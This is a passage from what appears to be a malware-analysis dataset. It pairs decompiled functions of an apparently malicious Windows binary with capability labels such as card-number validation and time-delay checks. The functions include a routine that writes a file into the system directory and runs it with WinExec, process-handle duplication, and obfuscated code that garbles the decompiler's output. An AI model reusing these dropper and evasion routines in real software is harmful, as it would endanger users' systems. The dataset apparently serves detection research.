            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404b90(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x4235e8 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004029e0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e4, acStack1304, &uStack2112);\n    uStack2088 = 0x40736c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407384;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004046a0(auStack1564, 0x4072e0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1871
    },
    "00403690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403690(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00402920;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x4115a0;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "00401000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00401000(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint hModule;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x4235b8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    *0x4235bc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x407130);\n    *0x4235c0 = (*pcVar1)(iVar2, 0x407140);\n    if (((*0x4235b8 != 0) && (*0x4235bc != 0)) && (*0x4235c0 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 233
    },
    "00402140": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402140(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 185
    },
    "null": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00403690(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00403b80(argv),  pcVar1 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar3 = _sym.imp.USER32.dll_GetDesktopWindow;\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar3)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar1)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 241
    },
    "004026e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040270f)\n\nvoid __cdecl fcn.004026e0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004024a0(&var_68h, &var_4h);\n    fcn.00401260(&var_68h, var_4h, 0x4074a0, 0xa100);\n    *arg_8h = 0x4074a0;\n    *arg_ch = 0xa100;\n    return;\n}\n",
        "token_count": 257
    },
    "00403850": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403867) overlaps instruction at (ram,0x00403864)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00403a46)\n\nvoid __fastcall fcn.00403850(uint32_t param_1, uint *param_2, uint32_t *param_3)\n\n{\n    uchar *puVar1;\n    uint16_t uVar2;\n    uint32_t in_EAX;\n    char *pcVar3;\n    uint uVar4;\n    uint16_t uVar5;\n    uint8_t uVar8;\n    uint uVar6;\n    uint32_t uVar7;\n    uint8_t uVar9;\n    uint *unaff_EBX;\n    uint16_t *puVar10;\n    uchar *puVar11;\n    uint32_t unaff_ESI;\n    uint32_t uVar12;\n    ushort unaff_DI;\n    uint uVar13;\n    char **ppcVar14;\n    ushort in_SS;\n    ushort in_DS;\n    bool in_CF;\n    bool bVar15;\n    bool in_ZF;\n    float10 in_ST0;\n    int32_t in_stack_5f9dff5f;\n    \n    if ((!in_ZF) && (param_1 = (param_1 >> 8 & 0xffff00) << 8 | param_1 & 0xffff,  in_ZF)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *param_3 = 0xc6;\n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        in_EAX = in_EAX & 0xe2f4cc58;\n    }\n    *(param_3 + 1) = 0xb9;\n    *(param_3 + 2) = 0x16;\n    bVar15 = (POPCOUNT(in_EAX + -1) & 1U) != 0;\n    *(param_3 + 3) = 0xf;\n    puVar11 = &stack0xfffffffc;\n    uVar12 = unaff_ESI;\n    if ((bVar15) && (puVar11 = &stack0xfffffffc,  !bVar15)) {\n        uVar12 = *param_3;\n        *param_3 = unaff_ESI;\n        puVar11 = &stack0xfffffffc + -in_stack_5f9dff5f;\n        if (puVar11 < 0) {\n            *param_2 = *(in_EAX + 0x58);\n            return;\n        }\n        in_DS = unaff_DI;\n        if (-1 < uVar12) {\n            param_2 = *unaff_EBX;\n            LOCK();\n            uVar12 = 0x138b2633;\n            bVar15 = SCARRY4(in_EAX, 0x658f517f);\n            in_EAX = in_EAX + 0x658f517f;\n            in_DS = *0x1e26fa6d;\n            goto code_r0x0040391e;\n        }\n    }\n    *(param_3 + 1) = 0xe5;\n    *(param_3 + 5) = 0x51;\n    bVar15 = false;\n    *(param_3 + 6) = 0xb4;\ncode_r0x0040391e:\n    uVar2 = in_EAX;\n    *(param_3 + 7) = 0x47;\n    if ((!bVar15) && (bVar15)) {\n        LOCK();\n        uVar12 = 0x138b2633;\n        uVar2 = uVar2 + 0x517f;\n        in_DS = *0x1e26fa6d;\n    }\n    *(param_3 + 2) = 0x4d;\n    *(param_3 + 9) = 0x29;\n    bVar15 = -1 < (uVar2 ^ unaff_EBX);\n    *(param_3 + 10) = 0x3a;\n    if ((bVar15) && (!bVar15)) {\n        *(param_3 + 7) = in_ST0;\n        in_DS = unaff_ESI;\n        param_3 = param_3 + 5;\n        uVar12 = uVar12 + 5;\n    }\n    *(param_3 + 0xb) = 0xca;\n    uVar2 = (uVar2 & 0xff | ((uVar2 >> 8) - unaff_EBX) + 0x4d << 8) & 0x26ae;\n    *(param_3 + 3) = 0xc6;\n    if ((uVar2 == 0) || (uVar2 != 0)) {\n        *(param_3 + 0xd) = 0xfc;\n    }\n    puVar10 = &stack0xfffffff4 ^ *(unaff_EBX + -0x3a);\n    puVar10[-1] = param_2;\n    uVar5 = puVar10[-1];\n    uVar2 = *puVar10;\n    uVar13 = *(puVar10 + 1);\n    puVar1 = *(puVar11 + 8);\n    puVar1[0xe] = 0x48;\n    *(puVar10 + 1) = param_1;\n    *(puVar10 + -1) = param_2 & 0xffff0000 | uVar5;\n    uVar6 = *(puVar10 + -1);\n    uVar4 = *(puVar10 + 1);\n    puVar1[0xf] = 0x4a;\n    *(puVar10 + 1) = uVar6;\n    *(puVar10 + -1) = uVar13;\n    ppcVar14 = *(puVar10 + -1);\n    uVar7 = *(puVar10 + 1);\n    puVar1[0x10] = 0x88;\n    *(puVar10 + 1) = uVar12 & 0xffff0000 | uVar2 | 0x50660000;\n    *(puVar10 + -1) = unaff_EBX;\n    uVar9 = unaff_EBX >> 8 ^ 0x16 | uVar2 >> 8;\n    uVar8 = uVar7 >> 8;\n    bVar15 = uVar9 == uVar8;\n    uVar6 = *(puVar10 + -1);\n    pcVar3 = *(puVar10 + 1);\n    puVar1[0x11] = 0x32;\n    if (uVar8 <= uVar9) {\n        puVar10[2] = uVar7;\n        uVar12 = uVar7 & 0xffff0000;\n        uVar7 = puVar10[2];\n        if (uVar9 < uVar8) {\n            out(0xc4, pcVar3);\n            puVar10[1] = in_DS;\n            uVar7 = uVar12 | uVar7 & 0xffffff00 | puVar10[2] ^ uVar4;\n            puVar10[-1] = in_SS;\n            *ppcVar14 = pcVar3;\n            *(puVar10 + -3) = uVar7;\n            bVar15 = uVar6 >> 8 == *pcVar3;\n        }\n    }\n    puVar1[0x12] = 0x78;\n    if ((!bVar15) && (bVar15)) {\n        out(*puVar1, uVar7);\n    }\n    **(puVar11 + 0xc) = 0x13;\n    return;\n}\n",
        "token_count": 1703
    },
    "00403a70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403ab7) overlaps instruction at (ram,0x00403ab6)\n// \n// WARNING: Removing unreachable block (ram,0x00403a8e)\n// WARNING: Removing unreachable block (ram,0x00403a95)\n// WARNING: Type propagation algorithm not settling\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00403a70(uint *param_1, uint *param_2)\n\n{\n    char **ppcVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint arg_ch;\n    uint *unaff_ESI;\n    uint *puVar3;\n    bool bVar4;\n    uint arg_14h;\n    uchar uStack108;\n    uchar auStack107 [99];\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar3 = auStack107;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    bVar4 = false;\n    iVar2 = fcn.00403850(&uStack108, &uStack8);\n    if ((bVar4) || (!bVar4)) {\n        arg_14h = 0x12000;\n        arg_ch = uStack8;\n    }\n    else {\n        ppcVar1 = iVar2 + 1;\n        *(puVar3 + 3) = *unaff_ESI;\n        *ppcVar1 = *ppcVar1 + (ppcVar1 >> 8);\n        *ppcVar1 = *ppcVar1 + ppcVar1;\n        arg_ch = 0x68fc558b;\n        arg_14h = extraout_ECX;\n    }\n    fcn.00401260(&uStack108, arg_ch, 0x4115a4, arg_14h);\n    *param_1 = 0x4115a4;\n    *param_2 = 0x12000;\n    return;\n}\n",
        "token_count": 499
    },
    "00403e10": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403e10(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4053d0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073f8);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407404);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &lpdwResult);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x407418);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar4 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x0040425f:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x0040426b:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x00404226:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x0040426b;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00404062:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00403c40(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x40742c);\n                        if (iVar1 != 0) goto joined_r0x00404062;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x0040420b:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x0040425f;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar1 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x0040420b;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00403c40(iVar1, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar1 = fcn.00403d60(&var_148h);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00404226;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2453
    },
    "004012e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401313) overlaps instruction at (ram,0x00401312)\n// \n// WARNING: Removing unreachable block (ram,0x00401310)\n\nuint __cdecl fcn.004012e0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    iVar1 = fcn.00403710(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    fcn.00403710(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 205
    },
    "00402210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402222) overlaps instruction at (ram,0x00402220)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402210(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    char cVar7;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t extraout_ECX;\n    char *pcVar8;\n    int32_t unaff_EDI;\n    uint8_t uVar9;\n    bool bVar10;\n    uint8_t in_AF;\n    char in_SF;\n    char in_OF;\n    ulong uVar11;\n    uint32_t uVar12;\n    uint var_4h;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar3 = fcn.00402b20(0x40707c);\n    if (iVar3 == -1) {\n        return 0;\n    }\n    puVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (puVar4 != NULL) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, puVar4, 0, 0, 0, 2);\n        uVar12 = 0x40228f;\n        uVar11 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar5);\n        pcVar8 = uVar11 >> 0x20;\n        uVar6 = uVar11;\n        uVar9 = 0;\n        bVar10 = (POPCOUNT(uVar6 & 0xff) & 1U) != 0;\n        if (uVar6 != 0) {\n            if ((bVar10) && (uVar2 = puVar4 << 0x10,  !bVar10)) {\n                out(*puVar4, uVar11 >> 0x20);\n                uVar9 = in_AF;\n                do {\n                    cVar7 = uVar6 >> 8;\n                    uVar9 = 9 < (uVar6 & 0xf) | uVar9;\n                    uVar6 = CONCAT31(CONCAT21(uVar6 >> 0x10, cVar7 - uVar9), -uVar9);\n                    puVar4 = uVar12 & 0xffff | uVar2;\n                } while (uVar9 || cVar7 == *pcVar8);\n            }\n            piVar1 = unaff_EDI + pcVar8 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - uVar9;\n            *(extraout_ECX + 0x56) = uVar6;\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar4);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 679
    },
    "004024a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
